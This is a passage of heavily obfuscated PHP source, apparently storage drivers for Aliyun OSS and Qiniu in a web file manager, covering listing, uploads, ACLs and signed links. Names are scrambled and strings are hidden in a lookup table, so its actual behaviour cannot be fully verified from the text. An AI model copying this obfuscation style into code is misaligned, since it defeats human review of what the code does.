(isset($§úğÛŠŠ[$ğ¹Ü£æ™[88]])) { $§÷—Õƒ[$ğ¹Ü£æ™[88]] = $§úğÛŠŠ[$ğ¹Ü£æ™[88]]; } if (isset($§úğÛŠŠ[$ğ¹Ü£æ™[206]]) && !trim($§÷—Õƒ[$ğ¹Ü£æ™[88]])) { $§÷—Õƒ[$ğ¹Ü£æ™[88]] = $§úğÛŠŠ[$ğ¹Ü£æ™[206]]; } return $§÷—Õƒ; } private function folderInfo($÷Œ¬Î–, $Å¥ÖÀ¢Ö = false, $Ñ¥¯™™Ä = array()) { $ÆĞ‘Ë““ =& $_SERVER[ç¦¬”œš]; $Ñ·ÑÀÓ = array($ÆĞ‘Ë““[32] => $this->pathThis($÷Œ¬Î–), $ÆĞ‘Ë““[87] => $this->getPathOuter($ÆĞ‘Ë““[8] . $÷Œ¬Î–), $ÆĞ‘Ë““[33] => $ÆĞ‘Ë““[78]); if ($Å¥ÖÀ¢Ö) { return $Ñ·ÑÀÓ; } $Ñ·ÑÀÓ[$ÆĞ‘Ë““[231]] = $Ñ·ÑÀÓ[$ÆĞ‘Ë““[88]] = 0; $Ñ·ÑÀÓ[$ÆĞ‘Ë““[232]] = $Ñ·ÑÀÓ[$ÆĞ‘Ë““[233]] = !0; if (empty($Ñ¥¯™™Ä)) { $÷Œ¬Î– = rtrim($÷Œ¬Î–, $ÆĞ‘Ë““[8]) . $ÆĞ‘Ë““[8]; $şı²›Æ„ = $this->objectMeta($÷Œ¬Î–); if (!$şı²›Æ„) { return $Ñ·ÑÀÓ; } $Ñ¥¯™™Ä = array($ÆĞ‘Ë““[231] => $şı²›Æ„[$ÆĞ‘Ë““[584]][$ÆĞ‘Ë““[1482]], $ÆĞ‘Ë““[88] => strtotime($şı²›Æ„[$ÆĞ‘Ë““[1479]])); } if (isset($Ñ¥¯™™Ä[$ÆĞ‘Ë““[88]])) { $Ñ·ÑÀÓ[$ÆĞ‘Ë““[88]] = $Ñ¥¯™™Ä[$ÆĞ‘Ë““[88]]; } if (isset($Ñ¥¯™™Ä[$ÆĞ‘Ë““[231]])) { $Ñ·ÑÀÓ[$ÆĞ‘Ë““[231]] = $Ñ¥¯™™Ä[$ÆĞ‘Ë““[231]]; } return $Ñ·ÑÀÓ; } public function listPath($åİåœ³Û, $À×£ÚÀŸ = false) { $ÒØ¨áÅÑ =& $_SERVER[ç¦¬”œš]; $ˆğ¬İæÇ = $this->fileList($åİåœ³Û, $ÒØ¨áÅÑ[8], !0); foreach ($ˆğ¬İæÇ[$ÒØ¨áÅÑ[85]] as $»³¨áìƒ => $°¨âÍÂò) { $ˆğ¬İæÇ[$ÒØ¨áÅÑ[85]][$»³¨áìƒ] = $this->folderInfo($°¨âÍÂò, $À×£ÚÀŸ, $°¨âÍÂò); } foreach ($ˆğ¬İæÇ[$ÒØ¨áÅÑ[86]] as $»³¨áìƒ => $°¨âÍÂò) { $ˆğ¬İæÇ[$ÒØ¨áÅÑ[86]][$»³¨áìƒ] = $this->fileInfo($°¨âÍÂò[$ÒØ¨áÅÑ[32]], $À×£ÚÀŸ, $°¨âÍÂò); } return $ˆğ¬İæÇ; } protected function infoChildren($ÉÔñÎ‡», &$êŒí¶Õº) { $şœıÏ³Ö =& $_SERVER[ç¦¬”œš]; $ç’Ã·Ğ = $this->fileList($ÉÔñÎ‡», $şœıÏ³Ö[12], !0); $êŒí¶Õº[$şœıÏ³Ö[81]] += count($ç’Ã·Ğ[$şœıÏ³Ö[85]]); $êŒí¶Õº[$şœıÏ³Ö[80]] += count($ç’Ã·Ğ[$şœıÏ³Ö[86]]); foreach ($ç’Ã·Ğ[$şœıÏ³Ö[86]] as $ëÂàíÍ­) { if (!$ëÂàíÍ­ || !$ëÂàíÍ­[$şœıÏ³Ö[79]]) { continue; } $êŒí¶Õº[$şœıÏ³Ö[79]] += $ëÂàíÍ­[$şœıÏ³Ö[79]]; } } public function has($½“¾Æõõ, $£î¿Â»” = false, $Ğ•ïêŠÀ = true) { $¨îî»ø =& $_SERVER[ç¦¬”œš]; $½“¾Æõõ = trim($½“¾Æõõ, $¨îî»ø[8]); $œÔûß¢Ù = empty($½“¾Æõõ) && $½“¾Æõõ !== $¨îî»ø[228] ? $¨îî»ø[12] : $½“¾Æõõ . $¨îî»ø[8]; $Šıô½î = $¨îî»ø[12]; $áÏÜÈ¹¹ = 500; $ü¥í‹ Î = $œíÁÜ÷ = 0; while (!0) { check_abort(); $™Õ×œ§ = array($¨îî»ø[1473] => $¨îî»ø[8], $¨îî»ø[1474] => $œÔûß¢Ù, $¨îî»ø[1475] => $áÏÜÈ¹¹, $¨îî»ø[1476] => $Šıô½î); try { $÷ŞÖÄ† = $this->client->listObjects($this->bucket, $™Õ×œ§); } catch (OSS\Core\OssException $İ¨û•ı) { $this->writeLog(__FUNCTION__ . $¨îî»ø[214] . $İ¨û•ı->getMessage()); break; } $Šıô½î = $÷ŞÖÄ†->getNextMarker(); $Ê°‹—í¶ = $÷ŞÖÄ†->getObjectList(); $íÄŠ•ï = $÷ŞÖÄ†->getPrefixList(); if ($£î¿Â»”) { if (count($Ê°‹—í¶) > 1 || count($Ê°‹—í¶) == 1 && $Ê°‹—í¶[0]->getKey() != $œÔûß¢Ù) { $ü¥í‹ Î += count($Ê°‹—í¶) - 1; } if (!empty($íÄŠ•ï)) { $œíÁÜ÷ += count($íÄŠ•ï); } if ($Šıô½î === $¨îî»ø[12]) { break; } continue; } if ($Ğ•ïêŠÀ) { if (!empty($Ê°‹—í¶)) { if (count($Ê°‹—í¶) > 1 || $Ê°‹—í¶[0]->getKey() != $œÔûß¢Ù) { return !0; } } } else { if (!empty($íÄŠ•ï)) { return !0; } } if ($Šıô½î === $¨îî»ø[12]) { break; } } if ($£î¿Â»”) { return array($¨îî»ø[239] => $ü¥í‹ Î, $¨îî»ø[240] => $œíÁÜ÷); } return !1; } public function listAll($—Ï§ŞÔ¹) { $Ö¬Ëè¢İ =& $_SERVER[ç¦¬”œš]; $„Ëø­Š = $this->fileList($—Ï§ŞÔ¹, $Ö¬Ëè¢İ[12], !0); $‡Ôçá­ = array_to_keyvalue($„Ëø­Š[$Ö¬Ëè¢İ[86]], $Ö¬Ëè¢İ[32]); foreach ($„Ëø­Š[$Ö¬Ëè¢İ[85]] as $ÆÍ»’ÆĞ) { if (is_string($ÆÍ»’ÆĞ)) { $‡Ôçá­[$ÆÍ»’ÆĞ] = array($Ö¬Ëè¢İ[79] => 0); } } return $this->listAllFiles($—Ï§ŞÔ¹, $‡Ôçá­); } public function canRead($»ı¼ŞáÆ) { $îÍ›áÙË =& $_SERVER[ç¦¬”œš]; $³…òœÄª = $this->pathAcl($»ı¼ŞáÆ); return $³…òœÄª == $îÍ›áÙË[1483] || $³…òœÄª == $îÍ›áÙË[628] ? !0 : !1; } public function canWrite($¦¸ ÅÁô) { $Î’ïğÕÈ = $this->pathAcl($¦¸ ÅÁô); return $Î’ïğÕÈ == $_SERVER[ç¦¬”œš][628] ? !0 : !1; } public function pathAcl($Ü³½ëıâ) { $¯Ê‹ãâ† =& $_SERVER[ç¦¬”œš]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÛìÉòÎ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ü³½ëıâ)); } catch (OSS\Core\OssException $µ™€ëŒÜ) { $this->writeLog(__FUNCTION__ . $¯Ê‹ãâ†[214] . $µ™€ëŒÜ->getMessage()); return !1; } $ÔÈ‚× = $ÛìÉòÎ == $¯Ê‹ãâ†[37] ? $this->bucketAcl : $ÛìÉòÎ; if ($ÔÈ‚× == $¯Ê‹ãâ†[1484]) { return $¯Ê‹ãâ†[1483]; } if ($ÔÈ‚× == $¯Ê‹ãâ†[1485]) { return $¯Ê‹ãâ†[628]; } return $ÔÈ‚×; } private function chmodPath($Ì°Î …”, $É›¨©¯¨ = '') { $âŸíØ¿‡ =& $_SERVER[ç¦¬”œš]; $òÀüÊŒÕ = empty($É›¨©¯¨) ? $âŸíØ¿‡[1485] : $É›¨©¯¨; $¶ºš¬ß° = array($âŸíØ¿‡[37], $âŸíØ¿‡[229], $âŸíØ¿‡[1484], $âŸíØ¿‡[1485]); if (!in_array($òÀüÊŒÕ, $¶ºš¬ß°)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ì°Î …”), $òÀüÊŒÕ); } catch (OSS\Core\OssException $»‰‡š¾ó) { $this->writeLog(__FUNCTION__ . $âŸíØ¿‡[214] . $»‰‡š¾ó->getMessage()); return !1; } return !0; } public function getContent($ñ×Õ““) { return $this->fileSubstr($ñ×Õ““, -1); } public function setContent($óÏğÃÓ, $ÍÌ³ß = '') { $èº”ÀÙÕ =& $_SERVER[ç¦¬”œš]; try { $é‹†¸ş = $this->trafficLimit($èº”ÀÙÕ[1486]); $§ğøÃŠ = $this->client->putObject($this->bucket, $this->pathEncode($óÏğÃÓ), $ÍÌ³ß, $é‹†¸ş); } catch (OSS\Core\OssException $œ†›¨İô) { $this->writeLog(__FUNCTION__ . $èº”ÀÙÕ[214] . $œ†›¨İô->getMessage()); return !1; } $Ú•Û¼Ğã = array($èº”ÀÙÕ[1480] => trim($§ğøÃŠ[$èº”ÀÙÕ[1477]], $èº”ÀÙÕ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($óÏğÃÓ))); $this->updateObjMeta($óÏğÃÓ, $Ú•Û¼Ğã); return isset($§ğøÃŠ[$èº”ÀÙÕ[1487]][$èº”ÀÙÕ[292]]) ? !0 : !1; } private function updateObjMeta($•³Á¥¬, $ÖğĞÀ§”) { $•³Á¥¬ = $this->pathEncode($•³Á¥¬); try { $ö¨È»åœ = array(OSS\OssClient::OSS_HEADERS => $ÖğĞÀ§”); $this->client->copyObject($this->bucket, $•³Á¥¬, $this->bucket, $•³Á¥¬, $ö¨È»åœ); } catch (OSS\Core\OssException $›¬Š’¡ƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][214] . $›¬Š’¡ƒ->getMessage()); return !1; } return !0; } public function upload($ê»øÖ´, $›š¨Ô­´, $¹ãéÁï = false, $Å‘¨¹Ÿì = REPEAT_REPLACE) { $ññôÇ®ú =& $_SERVER[ç¦¬”œš]; $Ì€ƒå = trim($ê»øÖ´, $ññôÇ®ú[8]); $º¨‚Öø‘ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ññôÇ®ú[1480] => @md5_file($›š¨Ô­´)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ê»øÖ´))); $º¨‚Öø‘ = $this->trafficLimit($ññôÇ®ú[1486], $º¨‚Öø‘); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ì€ƒå), $›š¨Ô­´, $º¨‚Öø‘); } catch (OSS\Core\OssException $‘‘ÓÙ) { $this->writeLog(__FUNCTION__ . $ññôÇ®ú[214] . $‘‘ÓÙ->getMessage()); return !1; } return $this->getPathOuter($ê»øÖ´); } public function getHost() { $Ñè¢½üñ =& $_SERVER[ç¦¬”œš]; $„‹Ÿµ« = explode($Ñè¢½üñ[210], parent::getHost()); return $„‹Ÿµ«[0] . $Ñè¢½üñ[210] . $this->bucket . $Ñè¢½üñ[10] . $„‹Ÿµ«[1]; } public function uploadFormData($œÊ•şû£, $éá’ıÌ• = 3600) { $ú‰È·º« =& $_SERVER[ç¦¬”œš]; if (!($¹æ»éò§ = $this->getHost())) { return !1; } $‘êÀúÔÂ = $éá’ıÌ•; $£íœ¹¼æ = date($ú‰È·º«[1488], time() + $‘êÀúÔÂ); $µ×œùº§ = new DateTime($£íœ¹¼æ); $¹öö€Œ = $µ×œùº§->format(DateTime::ISO8601); $ù¦¦æµ = strpos($¹öö€Œ, $ú‰È·º«[372]); $¹öö€Œ = substr($¹öö€Œ, 0, $ù¦¦æµ) . $ú‰È·º«[1489]; $¸·Ÿà°¬ = 1048576000 * 5; $¬ğÚ‘ø± = $this->pathFather($œÊ•şû£); $·˜×äÇ = array($ú‰È·º«[275] => $¹öö€Œ, $ú‰È·º«[278] => array(array($ú‰È·º«[1490], 0, $¸·Ÿà°¬), array($ú‰È·º«[281], $ú‰È·º«[282], $¬ğÚ‘ø±))); $Ë—ºãÎô = base64_encode(json_encode($·˜×äÇ)); $Á½ó×–‚ = base64_encode(hash_hmac($ú‰È·º«[263], $Ë—ºãÎô, $this->secret, !0)); $±»ã¯—Œ = array($ú‰È·º«[293] => $Ë—ºãÎô, $ú‰È·º«[1491] => $this->accessKey, $ú‰È·º«[285] => $ú‰È·º«[274], $ú‰È·º«[1492] => $Á½ó×–‚, $ú‰È·º«[208] => $¹æ»éò§); $±»ã¯—Œ = $this->trafficLimit($ú‰È·º«[1486], $±»ã¯—Œ); return $±»ã¯—Œ; } public function multiUploadFormData($Æ‘÷œíÅ, $³ÂşŞ´ = 3600) { $ªÎ¸ªÎØ =& $_SERVER[ç¦¬”œš]; if (!($Ç“ó¯Ñ“ = $this->getHost())) { return !1; } $­‚¬â×Œ = $this->trafficLimit($ªÎ¸ªÎØ[1486]); $¾­“¯ù° = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Æ‘÷œíÅ), $­‚¬â×Œ); return array($ªÎ¸ªÎØ[254] => $¾­“¯ù°, $ªÎ¸ªÎØ[208] => $Ç“ó¯Ñ“ . $ªÎ¸ªÎØ[8] . $this->pathEncode($Æ‘÷œíÅ), $ªÎ¸ªÎØ[255] => gmdate($ªÎ¸ªÎØ[1493]), $ªÎ¸ªÎØ[97] => $Æ‘÷œíÅ); } public function multiUploadAuthData($…ªÅŞÒƒ, $“êÛ¡¨š = array()) { $½¼İŒÊ˜ =& $_SERVER[ç¦¬”œš]; $Òú¿ÙÖ = isset($“êÛ¡¨š[$½¼İŒÊ˜[255]]) ? $“êÛ¡¨š[$½¼İŒÊ˜[255]] : gmdate($½¼İŒÊ˜[1493]); $ëüÒç±” = isset($“êÛ¡¨š[$½¼İŒÊ˜[169]]) ? $“êÛ¡¨š[$½¼İŒÊ˜[169]] : $½¼İŒÊ˜[12]; $õ™İ‹Ä = $…ªÅŞÒƒ; if (isset($“êÛ¡¨š[$½¼İŒÊ˜[97]])) { $õ™İ‹Ä = $“êÛ¡¨š[$½¼İŒÊ˜[97]]; unset($“êÛ¡¨š[$½¼İŒÊ˜[97]]); } if (isset($“êÛ¡¨š[$½¼İŒÊ˜[256]])) { $“êÛ¡¨š[$½¼İŒÊ˜[255]] = $Òú¿ÙÖ; return $this->listUploadParts($õ™İ‹Ä, $“êÛ¡¨š); } $•¯Â³ÛÃ = array($½¼İŒÊ˜[257], $½¼İŒÊ˜[12], $½¼İŒÊ˜[123], $Òú¿ÙÖ, "\x78\x2d\157\163\x73\x2d\x64\x61\164\145\72{$Òú¿ÙÖ}", $½¼İŒÊ˜[8] . $this->bucket . $½¼İŒÊ˜[8] . $õ™İ‹Ä . $ëüÒç±”); if (strpos($ëüÒç±”, $½¼İŒÊ˜[258]) === 0) { $•¯Â³ÛÃ[0] = $½¼İŒÊ˜[259]; if ($¶âüÛâÚ = $this->trafficLimit($½¼İŒÊ˜[1486])) { $õ™İ‹Ä = $½¼İŒÊ˜[1494]; array_splice($•¯Â³ÛÃ, 5, 0, $õ™İ‹Ä . $½¼İŒÊ˜[4] . $¶âüÛâÚ[$õ™İ‹Ä]); } } if (isset($“êÛ¡¨š[$½¼İŒÊ˜[260]]) && $“êÛ¡¨š[$½¼İŒÊ˜[260]] == $½¼İŒÊ˜[261]) { $•¯Â³ÛÃ[0] = $½¼İŒÊ˜[261]; } if (!empty($“êÛ¡¨š[$½¼İŒÊ˜[1495]])) { $’øÍÛ†Ú = array_merge(array($•¯Â³ÛÃ[4]), $“êÛ¡¨š[$½¼İŒÊ˜[1495]]); sort($’øÍÛ†Ú); $•¯Â³ÛÃ[4] = implode($½¼İŒÊ˜[262], $’øÍÛ†Ú); } $é¾‡Ç†Ë = implode($½¼İŒÊ˜[262], $•¯Â³ÛÃ); $ãçÍÇæÛ = base64_encode(hash_hmac($½¼İŒÊ˜[263], $é¾‡Ç†Ë, $this->secret, !0)); $Œò©£› = $½¼İŒÊ˜[1463] . $this->accessKey . $½¼İŒÊ˜[4] . $ãçÍÇæÛ; if (strpos($ëüÒç±”, $½¼İŒÊ˜[258]) === 0) { $Œò©£› = array($½¼İŒÊ˜[265] => $Œò©£›, $½¼İŒÊ˜[255] => $Òú¿ÙÖ); if ($¶âüÛâÚ) { $Œò©£› = array_merge($Œò©£›, $¶âüÛâÚ); } } return $Œò©£›; } public function listUploadParts($î°„ˆùÕ, $¢Øûüß¦) { $„‚Õéñ¢ =& $_SERVER[ç¦¬”œš]; $Ñíõà– = parse_url_query($¢Øûüß¦[$„‚Õéñ¢[169]]); $½ñÛ¬”ä = $this->client->listParts($this->bucket, $this->pathEncode($î°„ˆùÕ), $Ñíõà–[$„‚Õéñ¢[254]]); $×ÁÍúßú = $½ñÛ¬”ä->getListPart(); $ø¶ ¾èÇ = array(); foreach ($×ÁÍúßú as $áˆ»ÖÆ„) { $ø¶ ¾èÇ[] = array($„‚Õéñ¢[308] => $áˆ»ÖÆ„->getPartNumber(), $„‚Õéñ¢[309] => trim($áˆ»ÖÆ„->getETag(), $„‚Õéñ¢[121])); } unset($¢Øûüß¦[$„‚Õéñ¢[256]], $¢Øûüß¦[$„‚Õéñ¢[260]]); $¦î¹­©² = $this->multiUploadAuthData($î°„ˆùÕ, $¢Øûüß¦); if (empty($¦î¹­©²)) { return !1; } return array($„‚Õéñ¢[265] => $¦î¹­©², $„‚Õéñ¢[255] => $¢Øûüß¦[$„‚Õéñ¢[255]], $„‚Õéñ¢[267] => $ø¶ ¾èÇ); } public function download($°úœ¦Ç–, $ıÁòÉ—) { $·ë‚áÚ =& $_SERVER[ç¦¬”œš]; if ($this->isFolder($°úœ¦Ç–)) { return !1; } try { $Š«êö•ø = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ıÁòÉ—); $Š«êö•ø = $this->trafficLimit($·ë‚áÚ[112], $Š«êö•ø); $this->client->getObject($this->bucket, $this->pathEncode($°úœ¦Ç–), $Š«êö•ø); } catch (OSS\Core\OssException $í°é÷°ê) { $this->writeLog(__FUNCTION__ . $·ë‚áÚ[214] . $í°é÷°ê->getMessage()); return !1; } return $ıÁòÉ—; } public function fileSubstr($óà½ã‰İ, $ÇÒ»Ïú = 0, $ÆÎöıíÀ = false) { if ($ÇÒ»Ïú === -1) { $‹úÃ±Ç› = array(); } else { if ($ÆÎöıíÀ === !1) { $¦ÑáÓã» = $this->size($óà½ã‰İ); } else { $¦ÑáÓã» = $ÇÒ»Ïú + $ÆÎöıíÀ - 1; } $‹úÃ±Ç› = array(OSS\OssClient::OSS_RANGE => "{$ÇÒ»Ïú}\55{$¦ÑáÓã»}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($óà½ã‰İ), $‹úÃ±Ç›); } catch (OSS\Core\OssException $ª°¬ğ) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][214] . $ª°¬ğ->getMessage()); think_exception($ª°¬ğ->getMessage()); return !1; } } private function trafficLimit($ö©µ’‘ë, $ı˜¦àÑ¸ = array()) { $½ó™ÆÑ =& $_SERVER[ç¦¬”œš]; if ($ö©µ’‘ë == $½ó™ÆÑ[1486] && $this->isUploadServer() || $ö©µ’‘ë == $½ó™ÆÑ[112] && $this->isFileOutServer()) { return $ı˜¦àÑ¸; } $İÉ–¬Ä = floatval($GLOBALS[$½ó™ÆÑ[6]][$½ó™ÆÑ[92]][$½ó™ÆÑ[110]][$ö©µ’‘ë]) * 1024 * 1024 * 8; if (!$İÉ–¬Ä) { return $ı˜¦àÑ¸; } $İÉ–¬Ä = $İÉ–¬Ä < 819200 ? 819200 : ($İÉ–¬Ä > 838860800 ? 838860800 : $İÉ–¬Ä); $ı˜¦àÑ¸[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($İÉ–¬Ä); return $ı˜¦àÑ¸; } public function link($è–ˆ•â‰, $ş¼…Ñ«õ = array()) { $²Ù‡Åè– =& $_SERVER[ç¦¬”œš]; if (!$this->exist($è–ˆ•â‰) || $this->isFolder($è–ˆ•â‰)) { return !1; } try { $ş¼…Ñ«õ = $this->trafficLimit($²Ù‡Åè–[112], $ş¼…Ñ«õ); $“§ì¥Òú = $this->client->signUrl($this->bucket, $this->pathEncode($è–ˆ•â‰), 3600 * 12, $²Ù‡Åè–[261], $ş¼…Ñ«õ); return $this->getCdnLink($“§ì¥Òú); } catch (OSS\Core\OssException $»‡©â˜Ç) { $this->writeLog(__FUNCTION__ . $²Ù‡Åè–[214] . $»‡©â˜Ç->getMessage()); return !1; } } public function fileOut($—ŒÛÌ€‹, $‡Àë¥ˆï = false, $››‰­Â = false, $‚áäÁöÄ = '') { $¡’ÛÈ  =& $_SERVER[ç¦¬”œš]; if ($this->isFileOutServer()) { return $this->fileOutServer($—ŒÛÌ€‹, $‡Àë¥ˆï, $››‰­Â, $‚áäÁöÄ); } if (!$››‰­Â) { $››‰­Â = $this->pathThis($—ŒÛÌ€‹); } $››‰­Â = rawurlencode($››‰­Â); $äÖöŒ‚ú = get_file_mime(get_path_ext($››‰­Â)); if ($äÖöŒ‚ú == $¡’ÛÈ [248]) { return parent::fileOut($—ŒÛÌ€‹, $‡Àë¥ˆï, $››‰­Â, $‚áäÁöÄ); } $‡Àë¥ˆï = $‡Àë¥ˆï ? $¡’ÛÈ [1496] : $¡’ÛÈ [1497]; $Æ’ß–Û = array(OSS\OssClient::OSS_SUB_RESOURCE => $¡’ÛÈ [1498] . rawurlencode("{$‡Àë¥ˆï}\73\146\x69\154\x65\x6e\x61\155\145\75{$››‰­Â}")); $Æ’ß–Û[OSS\OssClient::OSS_SUB_RESOURCE] .= $¡’ÛÈ [1499] . rawurlencode($äÖöŒ‚ú); $åàúğœõ = $this->link($—ŒÛÌ€‹, $Æ’ß–Û); $this->fileOutLink($åàúğœõ); } public function fileOutServer($¬«òô–±, $ÔŞİŸ“È = false, $õ›÷ˆëÜ = false, $¥Ûà­¼Ÿ = '') { parent::fileOut($¬«òô–±, $ÔŞİŸ“È, $õ›÷ˆëÜ, $¥Ûà­¼Ÿ); } public function fileOutImage($Çéç½„¢, $Êâ×õ…• = 250) { if ($this->size($Çéç½„¢) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Çéç½„¢, $Êâ×õ…•); } $Ğ˜’‘’œ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ç¦¬”œš][1460] . $Êâ×õ…•); $…—Úâ‹ = $this->link($Çéç½„¢, $Ğ˜’‘’œ); $this->fileOutLink($…—Úâ‹); } public function fileOutImageServer($½À«Øş…, $ÛÈ€ş€İ = 250) { parent::fileOutImage($½À«Øş…, $ÛÈ€ş€İ); } public function fileOutLink($‰æÉôÅ½) { $àéÚïëß =& $_SERVER[ç¦¬”œš]; if (!$this->isCdnHost() && substr($‰æÉôÅ½, 0, 7) == $àéÚïëß[313]) { $‰æÉôÅ½ = $àéÚïëß[314] . substr($‰æÉôÅ½, 7); } header($àéÚïëß[175] . $‰æÉôÅ½); die; } public function hashMd5($Ëš¼ïÙ, $ª‡¦ËÎÉ = '') { $¿Ñ¹åñ’ =& $_SERVER[ç¦¬”œš]; $°Úâ–Ñ® = $this->_objectMeta($Ëš¼ïÙ); if (!$°Úâ–Ñ®) { return $¿Ñ¹åñ’[12]; } if (!isset($°Úâ–Ñ®[$¿Ñ¹åñ’[1480]]) && !empty($ª‡¦ËÎÉ)) { $•ÃãÀ› = $this->updateObjMeta($Ëš¼ïÙ, array($¿Ñ¹åñ’[1480] => $ª‡¦ËÎÉ)); $°Úâ–Ñ®[$¿Ñ¹åñ’[1480]] = $•ÃãÀ› ? $ª‡¦ËÎÉ : $¿Ñ¹åñ’[12]; } return isset($°Úâ–Ñ®[$¿Ñ¹åñ’[1480]]) ? strtolower($°Úâ–Ñ®[$¿Ñ¹åñ’[1480]]) : $¿Ñ¹åñ’[12]; } public function size($ù™´´ºí) { $ªÓ·æ·Á = $this->objectMeta($ù™´´ºí); return $ªÓ·æ·Á ? $ªÓ·æ·Á[$_SERVER[ç¦¬”œš][79]] : 0; } public function info($ñ²’¬û) { if ($this->isFolder($ñ²’¬û)) { return $this->folderInfo($ñ²’¬û); } else { if ($this->isFile($ñ²’¬û)) { return $this->fileInfo($ñ²’¬û); } } return !1; } public function exist($ı¡³Ú¼) { return $this->isFile($ı¡³Ú¼) || $this->isFolder($ı¡³Ú¼); } public function isFile($Ì¥ ûö¾) { return !$this->isFolder($Ì¥ ûö¾) && $this->objectMeta($Ì¥ ûö¾); } public function isFolder($üÛŠë‘›) { return $this->cacheMethod($_SERVER[ç¦¬”œš][179], $üÛŠë‘›); } protected function objectMeta($£ˆ¶’¬¸) { return $this->cacheMethod($_SERVER[ç¦¬”œš][181], $£ˆ¶’¬¸); } protected function _objectMeta($»‘î©Ì) { $åÍ´‹ÓÏ =& $_SERVER[ç¦¬”œš]; try { $¹ËÌá÷­ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($»‘î©Ì)); } catch (OSS\Core\OssException $ıè¡ë¸Í) { $this->writeLog(__FUNCTION__ . $åÍ´‹ÓÏ[214] . $ıè¡ë¸Í->getMessage()); $¹ËÌá÷­ = !1; } if ($¹ËÌá÷­) { $¹ËÌá÷­[$åÍ´‹ÓÏ[79]] = intval($¹ËÌá÷­[$åÍ´‹ÓÏ[1478]]); } return $¹ËÌá÷­; } protected function _isFolder($¸ú±ä) { $Çï×Â’Ã =& $_SERVER[ç¦¬”œš]; if ($¸ú±ä == $Çï×Â’Ã[12] || $¸ú±ä == $Çï×Â’Ã[8]) { return !0; } $û­¾ç™¯ = array($Çï×Â’Ã[1473] => $Çï×Â’Ã[8], $Çï×Â’Ã[1474] => rtrim($¸ú±ä, $Çï×Â’Ã[8]) . $Çï×Â’Ã[8], $Çï×Â’Ã[1475] => 1, $Çï×Â’Ã[1476] => $Çï×Â’Ã[12]); $ÔÛ€ç“á = $this->client->listObjects($this->bucket, $û­¾ç™¯); if ($ÔÛ€ç“á->getObjectList() || $ÔÛ€ç“á->getPrefixList()) { return !0; } return !1; } public function writeLog($Ì‘óÃ„ = '', $àŠß¨Á = false) { $ŞÁë‰·î =& $_SERVER[ç¦¬”œš]; $òÑÍüêÌ = in_array(ACTION, array($ŞÁë‰·î[212], $ŞÁë‰·î[213])); if (!$òÑÍüêÌ && !GLOBAL_DEBUG) { return; } $Ì¡çšğï = 0; if (stripos($Ì‘óÃ„, $ŞÁë‰·î[1500]) !== !1) { $Ì¡çšğï = 1; $©ØÑü—Ü = explode($ŞÁë‰·î[1501], $Ì‘óÃ„); $Ì‘óÃ„ = !empty($©ØÑü—Ü[1]) ? $©ØÑü—Ü[1] : $Ì‘óÃ„; } else { if (stripos($Ì‘óÃ„, $ŞÁë‰·î[1502])) { $Ì¡çšğï = 2; $©ØÑü—Ü = explode($ŞÁë‰·î[1502], $Ì‘óÃ„); $©ØÑü—Ü = explode($ŞÁë‰·î[4], $©ØÑü—Ü[0]); $Ì‘óÃ„ = !empty($©ØÑü—Ü[1]) ? $©ØÑü—Ü[1] : $Ì‘óÃ„; } } if ($òÑÍüêÌ && I18n::getType() == $ŞÁë‰·î[1503]) { if ($Ì¡çšğï == 1) { $Ì‘óÃ„ = str_replace($ŞÁë‰·î[1504], $ŞÁë‰·î[1505], $Ì‘óÃ„); } else { if ($Ì¡çšğï == 2) { $©ØÑü—Ü = explode($ŞÁë‰·î[214], $©ØÑü—Ü[0]); $Ï†Í‹³ = isset($©ØÑü—Ü[1]) ? $©ØÑü—Ü[1] : $ŞÁë‰·î[12]; $”åÂÄ“ = array($ŞÁë‰·î[1506] => $ŞÁë‰·î[1507], $ŞÁë‰·î[1508] => $ŞÁë‰·î[1509], $ŞÁë‰·î[1510] => $ŞÁë‰·î[1511], $ŞÁë‰·î[1512] => $ŞÁë‰·î[1513], $ŞÁë‰·î[1514] => $ŞÁë‰·î[1515], $ŞÁë‰·î[1516] => $ŞÁë‰·î[1517], $ŞÁë‰·î[1518] => $ŞÁë‰·î[1519], $ŞÁë‰·î[1520] => $ŞÁë‰·î[1521], $ŞÁë‰·î[1522] => $ŞÁë‰·î[1523], $ŞÁë‰·î[1524] => $ŞÁë‰·î[1525]); if (isset($”åÂÄ“[$Ï†Í‹³])) { $Ì‘óÃ„ = $”åÂÄ“[$Ï†Í‹³]; } } } if (stripos($Ì‘óÃ„, $ŞÁë‰·î[1526])) { $Ì‘óÃ„ = $ŞÁë‰·î[1527]; } } if (!trim($Ì‘óÃ„)) { return; } parent::writeLog(trim($Ì‘óÃ„), $àŠß¨Á); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($·–©‡„Ö) { parent::__construct(); require_once SDK_DIR . $_SERVER[ç¦¬”œš][1528]; $this->_init($·–©‡„Ö); } public function _init($ Úè“±ö) { $‘ğÉ‹‰ =& $_SERVER[ç¦¬”œš]; $this->config = $ Úè“±ö; foreach ($ Úè“±ö as $™ó½İ•î => $ÖÓ§™š¡) { if (isset($this->{$™ó½İ•î})) { $this->{$™ó½İ•î} = $ÖÓ§™š¡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‘ğÉ‹‰[1529] . LNG($‘ğÉ‹‰[1464])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = 